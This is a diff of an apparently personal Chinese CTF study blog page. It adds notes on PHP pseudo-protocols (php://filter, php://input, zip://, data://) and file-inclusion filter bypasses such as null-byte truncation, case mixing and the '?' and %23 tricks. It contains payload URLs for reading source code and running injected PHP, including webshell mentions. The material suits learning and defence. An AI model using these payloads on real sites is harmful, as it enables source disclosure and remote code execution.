@@ -8,7 +8,7 @@
     <meta name="description" content="" />
     <meta name="keywords" content="" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
-    <link rel="icon" href="/MIA/images/antifragile_5.jpg" />
+    <link rel="icon" href="/MIA/images/bloodykitty.jpg" />
     <link rel="preconnect" href="https://cdn.staticfile.org" />
 <script src="https://cdn.staticfile.org/vue/3.3.4/vue.global.prod.min.js"></script>
 <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.0/css/all.min.css" />
@@ -169,7 +169,7 @@
             
             <span class="tag">
                 
-                <a href="/MIA/tags/LEARN/" style="color: #00a596">LEARN</a>
+                <a href="/MIA/tags/LEARN/" style="color: #ff7d73">LEARN</a>
             </span>
             
         </span>
@@ -275,7 +275,162 @@
 <li><code>allow_url_fopen</code>:off&#x2F;on</li>
 <li><code>allow_url_include</code>:仅php:&#x2F;&#x2F;input, php:&#x2F;&#x2F;stdin, php:&#x2F;&#x2F;memory, php:&#x2F;&#x2F;temp需要on</li>
 </ul>
-<h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4>
+<h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><ul>
+<li><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams）<ul>
+<li>在CTF中经常使用的是<code>php://filter</code>和</li>
+<li><code>php://input</code>，<code>php://filter</code>用于读取源码，</li>
+<li><code>php://input</code>用于执行php代码。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>php:&#x2F;&#x2F;filter</p>
+</blockquote>
+<h4 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h4><p>一种元封装器，设计用于数据流打开时的筛选过滤应用。对于如<code>readfile()</code>，<code>file()</code>，<code>fiel_get_contents()</code>等一体式的文件函数非常有用，在数据流内容读取之前没有机会应用其他过滤器。</p>
+<h4 id="参数-过滤器"><a href="#参数-过滤器" class="headerlink" title="参数&amp;过滤器"></a>参数&amp;过滤器</h4><p><strong>参数</strong>：</p>
+<ul>
+<li><code>resource=</code>： 必须项，指定了需要筛选过滤的数据流。</li>
+<li><code>read-</code>: 可选项，设定一个或多个过滤器名称，以管道符<code>(*\*)</code>分隔。</li>
+<li><code>write=</code>: 可选，设定一个或多个过滤器名称，以管道符<code>(\)</code>分隔。</li>
+<li><code>;</code>：任何没有以<code>read=</code>或者<code>write=</code>做前缀的筛选器列表会视情况应用于读或写链。</li>
+</ul>
+<p><strong>过滤器</strong></p>
+<ul>
+<li>字符过滤器</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>过滤器名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>string.rot13</code></td>
+<td>&#x3D;<code>str_rot13()</code>，rot13变换</td>
+</tr>
+<tr>
+<td><code>string.toupper</code></td>
+<td>&#x3D;<code>strtoupper</code>，转大写字母</td>
+</tr>
+<tr>
+<td><code>string.tolower</code></td>
+<td><code>strtolower()</code>，转小写</td>
+</tr>
+<tr>
+<td><code>string.strip_tags</code></td>
+<td><code>strip_tags()</code>，去除html、PHP语言标签</td>
+</tr>
+</tbody></table>
+<ul>
+<li>转换过滤器</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>过滤器名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>convert.base64-encode &amp; convert.base64-decode</code></td>
+<td>&#x3D;<code>base64_encode()/base64_decode()</code>，base64编码&#x2F;解码</td>
+</tr>
+<tr>
+<td><code>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</code></td>
+<td>quoted-printable字符串与8-bit字符串编码&#x2F;解码</td>
+</tr>
+</tbody></table>
+<ul>
+<li>压缩过滤器</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>过滤器名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>zlib.deflate &amp; zlib.inflate</code></td>
+<td>在本地文件系统中创建gzip兼容文件的方法，但不产生命令行工具，只是压缩和解压数据流中的有效载荷部分</td>
+</tr>
+<tr>
+<td><code>bzip2.compress &amp; bzip2.decompress</code></td>
+<td>在本地文件系统中创建bz2兼容文件方法</td>
+</tr>
+</tbody></table>
+<ul>
+<li>加密过滤器</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>过滤器名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>mcrypt.*</code></td>
+<td>libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td><code>mdecrypt.*</code></td>
+<td>libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>1.读取文件源码（对php文件需要base64编码）</p>
+<pre><code class="url">http://xxx/include.php?filr=php://filter/read=covert.base64-encode/resource=xxx
+</code></pre>
+<p>2.执行php代码（结合post data）</p>
+<pre><code class="url">http://xxx/include.php?file=php://input
+使用hackbar或者其他的进行post data的输入
+[post data]一般是php代码，一句话木马version
+</code></pre>
+<h3 id="zip-、bzip2-、zlib"><a href="#zip-、bzip2-、zlib" class="headerlink" title="zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;、zlib:&#x2F;&#x2F;</h3><blockquote>
+<p>访问压缩文件中的子文件，不需要指定后缀名，也可以随意修改后缀名。</p>
+</blockquote>
+<p>1.压缩文件且修改后缀then上传</p>
+<pre><code class="txt">http://xxx/include.php?file=zip://E:\WWW\phpinfo.jpg%23phpinfo.txt
+压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传
+
+http://xxx/include.php?file=compress.bzip2://E:\WWW\phpinfo.bz2
+压缩 phpinfo.txt 为 phpinfo.bz2 并上传
+
+http://xxx/include.php?file=compress.zlib://E:\WWW\phpinfo.gz
+压缩 phpinfo.txt 为 phpinfo.gz 并上传
+</code></pre>
+<h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><pre><code class="txt">http://xxx/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
+&lt;yyy&gt;内容可以替换为其他php木马
+
+http://xxx/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<h2 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h2><h2>(LFI version)</h2>
+
+<h3 id="1-00截断-RFI-LFI"><a href="#1-00截断-RFI-LFI" class="headerlink" title="1.%00截断(RFI &amp; LFI)"></a>1.%00截断(RFI &amp; LFI)</h3><blockquote>
+<p>在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效。</p>
+</blockquote>
+<h3 id="2-路径长度截断"><a href="#2-路径长度截断" class="headerlink" title="2.路径长度截断"></a>2.路径长度截断</h3><blockquote>
+<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；<br>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
+</blockquote>
+<h3 id="3-点号截断"><a href="#3-点号截断" class="headerlink" title="3.点号截断"></a>3.点号截断</h3><blockquote>
+<p>windows系统点号长于256，超出的部分会被丢弃；<br>linux系统点号长于4096，超出的部分会被丢弃；</p>
+</blockquote>
+<h3 id="4-双写绕过"><a href="#4-双写绕过" class="headerlink" title="4.双写绕过"></a>4.双写绕过</h3><p>举例：<br><code>pphhpp://input</code></p>
+<h3 id="5-大小写混合绕过"><a href="#5-大小写混合绕过" class="headerlink" title="5.大小写混合绕过"></a>5.大小写混合绕过</h3><p>举例：<br><code>Php://input</code></p>
+<h3 id="6-伪协议绕过"><a href="#6-伪协议绕过" class="headerlink" title="6.伪协议绕过"></a>6.伪协议绕过</h3><p>前面说的那些</p>
+<h2>(RFI version)</h2>
+
+<h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><pre><code class="txt">1.txt
+content: &lt;?php phpinfo();?&gt;
+在远端服务器网站目录中
+
+访问时出现1.txt.php报错，所以修改访问URL为http://xxx/1.txt?
+就会执行内容php代码
+</code></pre>
+<p>后面几个也都是在文件末尾添加</p>
+<h3 id="23绕过"><a href="#23绕过" class="headerlink" title="%23绕过"></a>%23绕过</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href=https://segmentfault.com/a/1190000018991087>PHP伪协议总结</a></p>
+
     </div>
     
     
